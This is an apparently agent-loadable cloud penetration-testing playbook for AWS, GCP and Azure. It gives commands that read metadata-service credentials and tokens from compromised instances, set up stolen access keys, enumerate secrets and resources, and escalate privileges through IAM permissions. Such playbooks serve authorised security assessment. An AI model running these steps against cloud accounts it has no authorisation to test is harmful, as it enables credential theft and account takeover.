---
name: playbook-cloud
description: Cloud security playbook — AWS/GCP/Azure misconfiguration and attack patterns (IAM, storage, metadata, privesc). Load when the target is a cloud environment or you obtain cloud creds/metadata. Triggers - AWS/GCP/Azure, IAM role/policy, S3/blob bucket, 169.254.169.254 metadata, access key, assume-role, cloud console.
---

# Cloud Security Assessment Playbook

## AWS

### Reconnaissance
```bash
# Enumerate S3 buckets
aws s3 ls s3://<company>-<env> --no-sign-request
aws s3 ls s3://<bucket> --no-sign-request --recursive

# Check for public snapshots
aws ec2 describe-snapshots --owner-ids <account_id> --region <region>

# IMDS (from compromised EC2)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/user-data
```

### Credential Abuse
```bash
# Configure stolen credentials
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>

# Enumerate permissions
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <user>
aws iam get-policy-version --policy-arn <arn> --version-id v1

# Enumerate resources
aws ec2 describe-instances --region <region>
aws s3api list-buckets
aws lambda list-functions --region <region>
aws rds describe-db-instances --region <region>
aws secretsmanager list-secrets --region <region>
```

### Privilege Escalation
- `iam:CreatePolicyVersion` → attach admin policy
- `iam:AttachUserPolicy` → attach AdministratorAccess
- `lambda:CreateFunction` + `iam:PassRole` → execute as privileged role
- `sts:AssumeRole` → pivot to other roles
- Tools: `pacu`, `pmapper`

## GCP

### Reconnaissance
```bash
# Metadata server (from compromised instance)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Enumerate with credentials
gcloud projects list
gcloud compute instances list
gcloud storage ls
gcloud iam service-accounts list
gcloud secrets list
```

### Key Checks
- Public Cloud Storage buckets
- Default service account with broad permissions
- Overprivileged IAM bindings
- Exposed GKE clusters
- Cloud Functions with secrets in env vars

## Azure

### Reconnaissance
```bash
# Enumerate tenant info
curl https://login.microsoftonline.com/<domain>/.well-known/openid-configuration

# IMDS (from compromised VM)
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# With token
az account list
az vm list
az storage account list
az keyvault list
az ad user list
```

### Key Checks
- Public blob storage containers
- Exposed App Services / Function Apps
- Overprivileged Managed Identities
- Azure AD misconfigurations (guest access, app registrations)
- Network Security Groups allowing broad ingress
- Key Vault access policies

## Cross-Cloud Checks
- Hardcoded credentials in repos/CI
- Overprivileged service accounts
- Public storage (S3/GCS/Blob)
- Metadata service access (SSRF → cloud creds)
- Logging gaps (CloudTrail/StackDriver/Azure Monitor)
- MFA not enforced on admin accounts
